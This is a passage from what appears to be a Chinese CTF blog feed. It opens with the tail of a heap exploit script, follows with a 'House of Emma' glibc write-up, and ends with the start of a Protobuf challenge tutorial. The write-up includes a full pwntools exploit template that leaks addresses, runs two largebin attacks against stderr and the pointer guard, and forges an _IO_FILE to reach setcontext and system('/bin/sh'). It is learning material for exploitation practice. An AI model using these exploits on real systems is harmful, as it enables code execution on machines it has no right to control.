class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gadget_addr = <span class="number">0x0000000000165fa0</span>+libc_addr</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ioaddr=heap_addr+<span class="number">0x6e0</span></span><br><span class="line">flag_addr = heap_addr+<span class="number">0x728</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0x730</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+<span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(setcontext_addr)</span><br><span class="line">fake_IO_FILE +=p64(gadget_addr)<span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_addr+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(ioaddr) <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_addr+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_addr+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)+p64(heap_addr+<span class="number">0x740</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_addr+<span class="number">0x7e0</span>)+p64(ret_addr)  <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE += p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">fake_IO_FILE += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(heap_addr+<span class="number">0x1000</span>)+p64(rdx_addr)+p64(<span class="number">0x100</span>)+p64(read_addr)</span><br><span class="line">fake_IO_FILE += p64(rdi_addr)+p64(<span class="number">1</span>)+p64(rsi_addr)+p64(heap_addr+<span class="number">0x1000</span>)+p64(rdx_addr)+p64(<span class="number">0x100</span>)+p64(write_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(fake_IO_FILE),fake_IO_FILE)</span><br><span class="line">payload = cyclic(<span class="number">0x508</span>)+p64(<span class="number">0x300</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x143A)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">add(<span class="number">0x1000</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Emma</title>
      <link href="/2023/06/06/House-of-Emma/"/>
      <url>/2023/06/06/House-of-Emma/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一种利用难度低 但是效果很强大的house of链 只需要两次largebinattack就可以做到控制程序执行流</p><h2 id="链路分析"><a href="#链路分析" class="headerlink" title="链路分析"></a>链路分析</h2><p>触发方式是基于house of kiwi 通过top chunk的size不足以供分配时 申请一个大size 而此时top chunk的size经过不正常覆盖 导致的检测失败 触发报错 引起的stderr结构体任意函数调用</p><p>断点打在所有的伪造已经结束后 我们触发报错 准备利用fake_file  跟进到malloc函数中的int_malloc</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061230850.png" title="image-20230606123006752" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061230850.png" alt="image-20230606123006752"></a></p><p>随后跟进到sysmalloc函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061231844.png" title="image-20230606123122801" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061231844.png" alt="image-20230606123122801"></a></p><p>触发malloc_assert函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061232290.png" title="image-20230606123202245" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061232290.png" alt="image-20230606123202245"></a></p><p>到这里和house of kiwi都还是利用的同一条链 接下来的会有所差别 house of kiwi考的是劫持IO_list_all来实现的fake_file 随后劫持vtable结构体 而此次链是利用stderr标准报错的输出来利用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061233028.png" title="image-20230606123346995" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061233028.png" alt="image-20230606123346995"></a></p><p>我们首先需要跟进一下__fxprintf函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061235347.png" title="image-20230606123545306" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061235347.png" alt="image-20230606123545306"></a></p><p>从这两条汇编可以看出 确实是和stderr有关 这里其存储的值已经被我利用largebinattack修改为了堆地址</p><p>接下来 来看一下是如何一步步获取控制执行流的能力以及要绕过哪些判断</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061237566.png" title="image-20230606123752522" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061237566.png" alt="image-20230606123752522"></a></p><p>这里是第一个需要注意的点  此时rdi的值由rbx+0x88索引得到 而这个地址也是位于堆地址上的 这个值在随后的cmp指令中 嵌套了一个qword ptr 这意味着其值需为一个地址 才能继续执行下去 这里我选择的是堆基址 也就是rdi如图所示的值</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061240343.png" title="image-20230606124012303" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061240343.png" alt="image-20230606124012303"></a></p><p>随后跟进到locked_vfxprintf函数中继续利用 随后继续跟进函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061241232.png" title="image-20230606124128195" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061241232.png" alt="image-20230606124128195"></a></p><p>接着你会发现 在这个函数中 存在一个致命的任意函数调用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061242540.png" title="image-20230606124234491" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061242540.png" alt="image-20230606124234491"></a></p><p>这张图中最重要的就是rax寄存器 这个值如何控制 可以看到call执行的地址和rax寄存器是相关的 控制了rax也就可以控制程序执行流</p><p>我们回溯一下汇编代码 定位到可供我们控制rax值的语句</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061247147.png" title="image-20230606124702103" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061247147.png" alt="image-20230606124702103"></a></p><p>我们定位了到了这一句 可以看出此时r12寄存器的值是我们覆盖stderr的堆地址 也就是说在对应0xd8偏移处 填入我们想要其call的目标 就可以劫持程序执行流 实际上也就是覆盖了vtable结构体</p><p>那么接下来的手法就是很普遍的2.29以后万能gadget+setcontext的办法来控制程序执行流 这里我懒得写orw了  只写了个system链 完整的伪造随后分析吧 接下来来看一下相关的注意事项</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>首先我们要明白本次利用是如何获取执行流控制的机会的  对于vtable的具体位置的检测是比较宽松的 也就是说我们可以轻微的更改原本的偏移 使得我们调用到原本vtable表中的任意函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这么多函数中 存在部分函数 其参数和调用指针均可被file结构体控制 所以就相当于一次任意指针调用 供我们控制程序执行流 以write举例</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到调用write的指针和参数 都是由file结构体提供的 同时这里还要注意一下这个选项</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>其主要的作用就是起到加密指针 将原本的指针ror后 再和fs寄存器0x30偏移处的值进行异或</p><p>由于对应的值我们没有办法泄露出来 所以可以通过两次largebinattack覆盖其为我们已知的值</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061309185.png" title="image-20230606130915152" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306061309185.png" alt="image-20230606130915152"></a></p><p>而两次largebinattack需要比较多的辅助chunk 我们肯定是想着能用到较少的chunk更好 所以就存在了第一次largebinattack完以后 我们需要重新回收chunk 将其从bin中重新申请出来 就需要恢复两个largebin chunk的四个域</p><h2 id="利用模板"><a href="#利用模板" class="headerlink" title="利用模板"></a>利用模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x420</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebfd0</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x6d0</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">stderr_addr = libc_addr + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">former_libc = libc_addr + <span class="number">0x1ebfd0</span></span><br><span class="line">chunk0_addr = heap_addr +<span class="number">0x290</span></span><br><span class="line">chunk2_addr = heap_addr +<span class="number">0x6e0</span></span><br><span class="line">payload = p64(former_libc)+p64(chunk0_addr)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(chunk2_addr)+p64(former_libc)+p64(chunk2_addr)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x420</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#7</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#8</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">TLS_addr = libc_addr+<span class="number">0x1f3580</span></span><br><span class="line">success(<span class="built_in">hex</span>(TLS_addr))</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(TLS_addr+<span class="number">0x30</span>-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">payload = p64(former_libc)+p64(chunk0_addr)*<span class="number">3</span><span class="comment">#+cyclic(0x58)+p64(heap_addr)</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(chunk2_addr)+p64(former_libc)+p64(chunk2_addr)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x508</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">srop_addr = heap_addr + <span class="number">0x7c0</span></span><br><span class="line">gadget_addr = libc_addr + <span class="number">0x00000000001547a0</span></span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret_addr = libc_addr + <span class="number">0x0000000000025679</span></span><br><span class="line">fake_IO_FILE = <span class="number">2</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_ptr = 0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(next_chain)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_addr)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_addr + <span class="number">0x1eca20</span> + <span class="number">0x40</span>)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE += p64(srop_addr)  <span class="comment"># rdi</span></span><br><span class="line">fake_IO_FILE += p64(srop_addr)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_addr + <span class="number">0x6e0</span>), <span class="number">0x11</span>))</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(setcontext_addr)</span><br><span class="line">fake_IO_FILE += cyclic(<span class="number">0x78</span>)+p64(heap_addr+<span class="number">0x868</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(fake_IO_FILE),fake_IO_FILE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *($rebase(0x1422))&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">add(<span class="number">0x1000</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>部分地方根据自己复现的二进制文件不同修改 自己动调一遍其实就懂了</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Protobuf协议</title>
      <link href="/2023/05/31/Protobuf%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/05/31/Protobuf%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一种数据传输协议 2023年的国赛初赛考了一题基于这个堆题 需要使用其才能完成菜单交互 其中几个用来pack和unpack的函数代码审计起来很恶心 如果不知道这个协议的 看到以后会无从下手 挺恶心人的 刚好我有出题的需要 就记录一下相关的</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>首先需要安装protoc 便于以后我们利用protoc文件生成py文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5</span><br><span class="line">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">sudo apt-get install autoconf automake libtool curl make g++ unzip</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitclone.com/github.com/protocolbuffers/protobuf.git </span><br><span class="line">cd protobuf</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>如果有出题需求的话 还需要安装protobuf-c 才能编译</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitclone.com/github.com/protobuf-c/protobuf-c.git</span><br><span class="line">cd protobuf-c/</span><br><span class="line">./autogen.sh &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>先从利用proto文件生成c语言编译所需要的pb-c.h文件说起</p><p>诸如这样写好一个proto文件后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">package test;</span><br><span class="line"></span><br><span class="line">message Student &#123;</span><br><span class="line">    optional string name = 1; //这个1无特殊含义 是表示顺序 如果还需要新增一个变量就=2</span><br><span class="line">&#125;</span><br><span class="line">optional和request是代表是否强制要求该数据 数据类型这个参照其他教程 我复制粘贴供哪天我本地查询</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1483459/202110/1483459-20211018182806212-191545196.png" title="img" class="gallery-item"><img src="https://img2020.cnblogs.com/blog/1483459/202110/1483459-20211018182806212-191545196.png" alt="img"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protoc-c --c_out=./ ./pwn.proto</span><br></pre></td></tr></table></figure><p>使用上面的指令会生成两个文件</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305311401822.png" title="image-20230531140134732" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305311401822.png" alt="image-20230531140134732"></a></p><p>一个是在gcc编译时需要使用 一个是在源码编写中需要作为头文件导入</p><p>同时需要注意 proto文件中变量名不区分大小写</p><p>这个时候差不多就可以编写c语言源码了 直接上一个demo</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pwn.pb-c.h&quot;</span></span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">my_pack</span><span class="params">(<span class="type">char</span> *out)</span>&#123;</span><br><span class="line">    Test__Student a;</span><br><span class="line">    test__student__init(&amp;a);</span><br><span class="line">    a.name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> test__student__pack(&amp;a,out);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">my_unpack</span><span class="params">(<span class="type">size_t</span> len,<span class="type">const</span> <span class="type">uint8_t</span> *data)</span>&#123;</span><br><span class="line">    Test__Student *tmp = test__student__unpack(<span class="literal">NULL</span>,len,data);</span><br><span class="line">    test__student__free_unpacked(tmp, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> len = my_pack(buf);</span><br><span class="line">    Test__Student *tmp = test__student__unpack(<span class="literal">NULL</span>,len,buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,tmp-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个完整的流程是 初始化包 将其值打包 最后解包得到参数 最后还可以销毁包</p><p>这里的buf不一定要栈上 也可以malloc一块空间 总体应该还是很好理解的 这个时候我们就可以尝试编译了</p><p>还需要带上刚才生成的pb-c文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc pwn.pb-c.c test.c -o pwn -lprotobuf-c</span><br></pre></td></tr></table></figure><p>此时 直接运行会出现如下的报错</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305312240619.png" title="image-20230531224026544" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305312240619.png" alt="image-20230531224026544"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>该指令可以搜寻共享动态库 创建出动态装入程序所需的连接和缓存文件</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305312244034.png" title="image-20230531224452012" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305312244034.png" alt="image-20230531224452012"></a></p><p>可以看到成功输出hello 剩下的就没什么好说了 如果要想恶心一点就删符号表 静态编译 代码审计量巨大</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>拿今年CISCN初赛的一题来举例 我也是通过这题了解到protobuf 抛开交互这道题是一个堆 我估计他的源码是用malloc开空间 所以在后面堆的时候 堆结构会改变 就很烦 这里就不提了 可以去看我的wp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v3; <span class="comment">// rsi</span></span><br><span class="line">  __int64 *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1763(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;unk_A060, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>);</span><br><span class="line">    v3 = read(<span class="number">0</span>, &amp;unk_A060, <span class="number">0x400</span>uLL);</span><br><span class="line">    v4 = sub_192D(<span class="number">0LL</span>, v3, &amp;unk_A060);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      ((&amp;sub_1328 + <span class="number">1</span>))(<span class="number">0LL</span>, v3);</span><br><span class="line">    sub_155D(v4[<span class="number">3</span>], v4[<span class="number">4</span>], v4[<span class="number">5</span>], v4[<span class="number">6</span>], v4[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单交互题  需要我们利用protobuf来传输数据</p><p>第一步就是想办法复原出proto文件 